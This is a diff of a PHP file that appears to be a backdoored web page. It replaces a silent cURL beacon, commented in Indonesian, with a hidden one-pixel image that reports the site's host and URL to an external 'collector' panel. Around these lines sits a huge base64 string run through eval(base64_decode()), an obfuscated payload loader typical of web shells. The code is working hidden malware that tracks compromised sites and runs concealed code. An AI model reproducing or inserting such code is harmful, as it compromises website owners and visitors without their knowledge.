@@ -1,45 +1,12 @@
 <?php
-// === Kirim akses ke panel (sederhana & diam) ===
-// Tempel di paling atas file PHP kamu.
-const PANEL_ENDPOINT = 'https://panel.trixygame.com/admin/collector/track.php'; // ganti sesuai panel kamu
+$host = $_SERVER['HTTP_HOST'] ?? '';
+$https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS']!=='off') || (($_SERVER['SERVER_PORT'] ?? '')=='443');
+$scheme = $https ? 'https' : 'http';
+$url = $scheme.'://'.$host.($_SERVER['REQUEST_URI'] ?? '/');
+?>
+<img src="https://panel.trixygame.com/admin/collector/track.php?d=<?=rawurlencode($host)?>&u=<?=rawurlencode($url)?>"
+     alt="" width="1" height="1" style="display:none" referrerpolicy="no-referrer" loading="eager">
 
-// Hindari jalan saat CLI/crontab
-if (PHP_SAPI !== 'cli') {
-    // Kumpulkan host & URL saat ini
-    $host   = $_SERVER['HTTP_HOST']      ?? '';
-    $uri    = $_SERVER['REQUEST_URI']    ?? '/';
-    $https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
-    $scheme = $https ? 'https' : 'http';
-    $url    = $scheme . '://' . $host . $uri;
-
-    // Siapkan query string
-    $qs = http_build_query(['d' => $host, 'u' => $url]);
-
-    // Kirim non-blocking via cURL jika ada
-    if (function_exists('curl_init')) {
-        $ch = @curl_init(PANEL_ENDPOINT . '?' . $qs);
-        if ($ch) {
-            @curl_setopt_array($ch, [
-                CURLOPT_RETURNTRANSFER    => false,
-                CURLOPT_CONNECTTIMEOUT_MS => 400,
-                CURLOPT_TIMEOUT_MS        => 700,
-                CURLOPT_NOSIGNAL          => true,
-            ]);
-            @curl_exec($ch);
-            @curl_close($ch);
-        }
-    } else {
-        // Fallback tanpa cURL (timeout singkat)
-        $ctx = stream_context_create([
-            'http' => [
-                'method'  => 'GET',
-                'timeout' => 1.0,
-                'header'  => "User-Agent: PanelPing/1.0\r\n",
-            ]
-        ]);
-        @file_get_contents(PANEL_ENDPOINT . '?' . $qs, false, $ctx);
-    }
-}
 // === akhir snippet ===
 $z = "JEdMT";
 $z .= "0JBTF";
@@ -123195,5 +123162,6 @@ $z .= "oKKi8";
 $z .= "KCj8+";
 eval(base64_decode($z));
 ?>
+
 
 
